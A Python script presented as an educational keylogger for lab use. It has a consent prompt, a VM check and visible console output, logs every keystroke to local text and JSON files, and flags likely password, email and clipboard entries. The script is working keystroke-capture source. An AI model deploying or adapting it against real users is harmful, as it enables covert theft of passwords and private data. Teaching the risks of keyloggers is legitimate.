

from pynput.keyboard        import Key, KeyCode, Listener
from datetime               import datetime
from collections            import defaultdict
import os, json, sys, platform

# ── Safety Gate ───────────────────────────────────────────────────────────────
def safety_confirmation():
    """
    Explicit runtime consent check.
    Forces the user to confirm they are in a controlled environment
    before the logger starts — prevents accidental deployment.
    """
    print("=" * 65)
    print("  EDUCATIONAL KEYLOGGER — Controlled Lab Environment Only")
    print("=" * 65)
    print("\n  ⚠  LEGAL WARNING")
    print("  Running a keylogger without explicit permission is illegal.")
    print("  Laws: CFAA (USA) | Computer Misuse Act (UK) | PECA 2016 (PAK)\n")
    print("  Confirm you are running this in a sandboxed/lab environment.")
    confirm = input("  Type YES to continue, anything else to exit: ").strip()
    if confirm.upper() != "YES":
        print("\n  [ABORTED] Keylogger did not start. Stay ethical!\n")
        sys.exit(0)

    # Optional: Detect if running inside a VM (basic heuristic)
    vm_hint = ""
    try:
        with open("/proc/cpuinfo", "r") as f:
            content = f.read().lower()
            if any(kw in content for kw in ["vmware", "virtualbox", "kvm", "qemu", "hypervisor"]):
                vm_hint = "  ✅ VM environment detected — safer for this exercise.\n"
    except FileNotFoundError:
        pass  # Windows — /proc not available

    if vm_hint:
        print(vm_hint)
    else:
        print("  ⚠  Could not confirm VM environment. Proceed carefully.\n")


# ── Configuration ─────────────────────────────────────────────────────────────
LOG_FILE_TXT  = "keylogs.txt"        # Human-readable log
LOG_FILE_JSON = "keylogs.json"       # Structured log for analysis
STOP_KEY      = Key.esc
SESSION_ID    = datetime.now().strftime("%Y%m%d_%H%M%S")

# Tracks currently held modifier keys for combo detection
active_modifiers = set()
MODIFIER_KEYS    = {Key.ctrl, Key.ctrl_l, Key.ctrl_r,
                    Key.shift, Key.shift_l, Key.shift_r,
                    Key.alt, Key.alt_l, Key.alt_r,
                    Key.cmd}

# In-memory JSON log — flushed to disk on each keystroke
json_log = []

# Pattern detection counters
pattern_stats = defaultdict(int)

# ── Helpers ───────────────────────────────────────────────────────────────────
def format_key(key):
    """
    Convert pynput key → clean human-readable string.
      Printable chars  → returned as-is  ('a', '5', '@')
      Special keys     → wrapped in brackets ([SPACE], [ENTER])
    """
    try:
        return key.char
    except AttributeError:
        return f"[{key.name.upper()}]"


def get_timestamp():
    """Return ISO-style timestamp for log entries."""
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")


def detect_combo(key):
    """
    Detect key combinations involving modifier keys.
    Examples: CTRL+C, CTRL+ALT+DEL, SHIFT+A
    Returns a combo string if modifiers are active, else None.
    """
    if not active_modifiers:
        return None

    mod_names = []
    for mod in active_modifiers:
        name = mod.name.upper().replace("_L", "").replace("_R", "")
        if name not in mod_names:
            mod_names.append(name)

    key_str = format_key(key)
    # Only flag as combo if the key itself isn't a modifier
    if key not in MODIFIER_KEYS:
        return "+".join(sorted(mod_names)) + "+" + key_str
    return None


def flag_sensitive_pattern(formatted_key):
    """
    Analyze keystrokes for patterns that demonstrate real-world risk.
    Flags sequences that resemble password entry, email typing, etc.
    This is the 'risk demonstration' part of the educational exercise.
    """
    alerts = []

    # Track ENTER presses — likely form/credential submissions
    if formatted_key == "[ENTER]":
        pattern_stats["enter_presses"] += 1
        if pattern_stats["enter_presses"] >= 1:
            alerts.append("⚠  RISK: ENTER pressed — possible form/login submission captured")

    # Flag @ sign — likely email address being typed
    if formatted_key == "@":
        pattern_stats["at_signs"] += 1
        alerts.append("⚠  RISK: '@' detected — possible email address being typed")

    # Flag long uninterrupted character sequences ONLY when ENTER is pressed
    # Logic: count consecutive chars, and when ENTER comes, THEN check if it was 8+
    if formatted_key not in ("[SPACE]", "[ENTER]", "[TAB]") and not formatted_key.startswith("["):
        pattern_stats["consecutive_chars"] += 1
    elif formatted_key == "[ENTER]":
        if pattern_stats["consecutive_chars"] >= 8:
            alerts.append(f"⚠  RISK: {pattern_stats['consecutive_chars']}-char sequence submitted — possible password entered")
        pattern_stats["consecutive_chars"] = 0   # Reset after ENTER
    else:
        pattern_stats["consecutive_chars"] = 0   # Reset on SPACE or TAB

    # Flag CTRL+C / CTRL+V — clipboard activity
    if formatted_key in ("CTRL+C", "CTRL+V"):
        alerts.append(f"⚠  RISK: {formatted_key} — clipboard activity detected")

    return alerts


def write_session_marker(label: str):
    """Write a visible start/end marker to the human-readable log."""
    border = "=" * 65
    with open(LOG_FILE_TXT, "a", encoding="utf-8") as f:
        f.write(f"\n{border}\n")
        f.write(f"  {label}\n")
        f.write(f"  Session ID : {SESSION_ID}\n")
        f.write(f"  OS         : {platform.system()} {platform.release()}\n")
        f.write(f"  Time       : {get_timestamp()}\n")
        f.write(f"{border}\n")


def write_json_log(entry: dict):
    """Append a structured entry to the JSON log file."""
    json_log.append(entry)
    try:
        with open(LOG_FILE_JSON, "w", encoding="utf-8") as f:
            json.dump({"session_id": SESSION_ID, "entries": json_log}, f, indent=2)
    except IOError as e:
        print(f"  [ERROR] Could not write JSON log: {e}")


def write_txt_log(line: str):
    """Append a line to the human-readable text log."""
    try:
        with open(LOG_FILE_TXT, "a", encoding="utf-8") as f:
            f.write(line + "\n")
    except IOError as e:
        print(f"  [ERROR] Could not write TXT log: {e}")


# ── Core Callbacks ────────────────────────────────────────────────────────────
def on_press(key):
    """
    Called every time a key is pressed.
    1. Updates modifier key tracking for combo detection.
    2. Detects key combinations (CTRL+C, SHIFT+A, etc.)
    3. Logs timestamped entry to both TXT and JSON formats.
    4. Flags sensitive patterns to demonstrate real-world risks.
    5. Stops listener cleanly when ESC is pressed.
    """
    # ── Track modifiers ─────────────────────────────────────────────────────
    if key in MODIFIER_KEYS:
        active_modifiers.add(key)

    # ── Stop condition ───────────────────────────────────────────────────────
    if key == STOP_KEY:
        write_session_marker("SESSION ENDED  (ESC pressed)")
        _write_summary()
        print("\n  [INFO] ESC detected — keylogger stopped safely.")
        print(f"  [INFO] TXT log : {os.path.abspath(LOG_FILE_TXT)}")
        print(f"  [INFO] JSON log: {os.path.abspath(LOG_FILE_JSON)}")
        return False

    # ── Detect combo or plain key ────────────────────────────────────────────
    combo     = detect_combo(key)
    formatted = combo if combo else format_key(key)
    timestamp = get_timestamp()

    # ── Write to TXT log ─────────────────────────────────────────────────────
    txt_line = f"[{timestamp}]  [SID:{SESSION_ID}]  {formatted}"
    write_txt_log(txt_line)

    # ── Write to JSON log ────────────────────────────────────────────────────
    json_entry = {
        "timestamp"  : timestamp,
        "session_id" : SESSION_ID,
        "key"        : formatted,
        "is_combo"   : combo is not None,
        "modifiers"  : [m.name for m in active_modifiers]
    }
    write_json_log(json_entry)

    # ── Console echo ─────────────────────────────────────────────────────────
    print(f"  Logged → {txt_line.strip()}")

    # ── Pattern / risk detection ─────────────────────────────────────────────
    alerts = flag_sensitive_pattern(formatted)
    for alert in alerts:
        print(f"  {alert}")
        write_txt_log(f"  {alert}")


def on_release(key):
    """
    Called every time a key is released.
    Removes released modifier keys from the active set so combos
    are tracked accurately (e.g., releasing CTRL ends combo window).
    Also logs key-hold duration awareness note for modifiers.
    """
    if key in MODIFIER_KEYS:
        active_modifiers.discard(key)


# ── Summary Report ────────────────────────────────────────────────────────────
def _write_summary():
    """
    Write a session summary to both logs.
    Demonstrates how an attacker could generate a structured report
    of captured activity — reinforcing the risk analysis.
    """
    total_keys   = len(json_log)
    combos       = sum(1 for e in json_log if e["is_combo"])
    enters       = pattern_stats["enter_presses"]
    at_signs     = pattern_stats["at_signs"]

    summary = f"""
{'=' * 65}
  SESSION SUMMARY — Risk Demonstration Report
  Session ID     : {SESSION_ID}
  Total Keys     : {total_keys}
  Key Combos     : {combos}  (CTRL+C, SHIFT+A, etc.)
  ENTER presses  : {enters}  (possible form submissions)
  '@' signs      : {at_signs}  (possible email addresses typed)
  
  WHAT AN ATTACKER COULD EXTRACT:
  - Every password typed (captured before encryption)
  - All URLs and search queries
  - Private messages and emails
  - Credit card numbers, PINs, personal data

  DEFENSE REMINDER:
  - Use 2FA on all accounts
  - Use a password manager (reduces typing passwords)
  - Keep antivirus/EDR updated
  - Monitor running processes regularly
{'=' * 65}
"""
    write_txt_log(summary)
    print(summary)


# ── Entry Point ───────────────────────────────────────────────────────────────
if __name__ == "__main__":
    # Step 1: Explicit consent + basic VM detection
    safety_confirmation()

    print("\n" + "=" * 65)
    print("  EDUCATIONAL KEYLOGGER — Session Starting")
    print("=" * 65)
    print(f"  TXT Log    : {os.path.abspath(LOG_FILE_TXT)}")
    print(f"  JSON Log   : {os.path.abspath(LOG_FILE_JSON)}")
    print(f"  Session ID : {SESSION_ID}")
    print(f"  OS         : {platform.system()} {platform.release()}")
    print(f"  Stop Key   : ESC")
    print("  Logging started. Type anything, press ESC to stop.")
    print("=" * 65 + "\n")

    write_session_marker("SESSION STARTED")

    # Step 2: Start listener (blocking)
    try:
        with Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()
    except Exception as e:
        print(f"\n  [ERROR] Listener failed to start: {e}")
        print("  Ensure pynput is installed: pip install pynput")
        sys.exit(1)
